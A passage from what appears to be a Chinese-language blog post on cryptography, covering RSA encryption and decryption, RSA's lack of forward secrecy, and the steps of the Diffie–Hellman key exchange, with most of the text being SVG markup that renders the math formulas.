684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1037.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2093.6,0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(1138,413) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mtext" transform="translate(3649.3,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mo" transform="translate(3899.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mtext" transform="translate(4288.3,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mtext" transform="translate(6177.3,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mi" transform="translate(6427.3,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7027.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p></li><li><p><strong>公钥解密</strong>：给定密文<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="1.719ex" height="1.645ex" role="img" focusable="false" viewBox="0 -705 760 727"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g></g></g></svg></mjx-container>，解密过程为：</p></li></ul><p>值得注意的是，<strong>RSA算法并不具有前向安全</strong>，因为它的公私钥是静态的，当黑客长期收集同一个私钥加密的数据时，一旦私钥泄露，那么之前被收集的加密数据均会被破解。</p><h3 id="DH算法"><a href="#DH算法" class="headerlink" title="DH算法"></a>DH算法</h3><p>DH 算法又称“Diffie–Hellman 算法”，像往常的算法名字一样，这是用俩个数学牛人的名字来命名的算法，<strong>实现安全的密钥交换</strong>，通讯双方在完全没有对方任何预先信息的条件下通过不安全信道创建起一个密钥。</p><p>下面讲一讲算法流程：</p><ol><li>Alice与Bob协定使用一个大素数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="1.138ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 503 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>和一个<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="1.138ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 503 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>的整数模<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>乘法群及其原根<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.079ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 477 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="3.223ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 1424.7 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(503,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(947.7,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g></g></g></svg></mjx-container>都公开</li><li>Alice选择一个随机数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.197ex" height="1.02ex" role="img" focusable="false" viewBox="0 -441 529 451"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container>（私钥）并计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="12.225ex" height="2.084ex" role="img" focusable="false" viewBox="0 -716 5403.6 921"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(1027.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2083.6,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mi" transform="translate(3017.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3895.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4380.6,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(4900.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>，并将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container>发送给Bob</li><li>Bob选择一个随机数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 429 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>（私钥）并计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="12.086ex" height="2.395ex" role="img" focusable="false" viewBox="0 -853.7 5341.9 1058.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(1036.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2092.6,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mi" transform="translate(2955.9,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3833.9,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4318.9,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(4838.9,0)"><path data-c="1D45D" 